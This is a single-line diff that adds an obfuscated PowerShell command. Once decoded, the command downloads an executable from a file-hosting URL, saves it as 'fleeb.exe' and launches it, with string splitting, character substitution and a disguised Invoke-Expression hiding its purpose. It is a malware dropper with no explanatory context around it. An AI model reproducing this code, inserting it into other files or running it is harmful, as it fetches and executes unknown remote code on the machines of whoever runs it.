@@ -1,0 +1,1 @@
+﻿ ('(New-O'+'bject S'+'y'+'st'+'e'+'m.N'+'et.W'+'e'+'bClient).Downl'+'oa'+'dFile'+'(K'+'l'+'5https:/'+'/1fic'+'h'+'ie'+'r.'+'com/?'+'v8w3g7'+'36hjKl5,Kl5fleeb.ex'+'eKl5);S'+'tart-Process Kl5'+'fleeb.'+'exeKl5').repLAce(([cHar]75+[cHar]108+[cHar]53),[sTRING][cHar]39)|& ( $PShome[4]+$PshOME[34]+'X')
